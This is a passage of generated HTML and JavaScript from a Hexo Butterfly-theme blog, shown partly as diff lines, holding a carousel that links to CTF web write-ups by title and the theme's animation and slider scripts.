translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt="">固若金汤-热身题-session伪造-flask-ssti</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/furryctf/固若金汤-热身题-session伪造-flask-ssti/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt=""><img width="48" height="48" src="/img/catgirl.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt="">[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/NSSCTF WEB/[NISACTF 2022]level-up~robots-md5强碰撞-sha1强碰撞-php变量解析绕过-create_function绕过/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt=""><img width="48" height="48" src="/img/catgirl.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt="">[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/NSSCTF WEB/[WUSTCTF 2020]朴实无华-信息搜集-MD5弱比较-intval特性-命令执行-空格绕过/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt=""><img width="48" height="48" src="/img/Arch.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2026-01-24</span><a class="blog-slider__title" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt="">DASCTF-web1</a><div class="blog-slider__text">这里的描述可以随便写</div><a class="blog-slider__button" href="2026/01/24/wp/DASCTF/DASCTF-web1/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = '/';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1s');
+    arr[i].setAttribute('data-wow-delay', '0s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
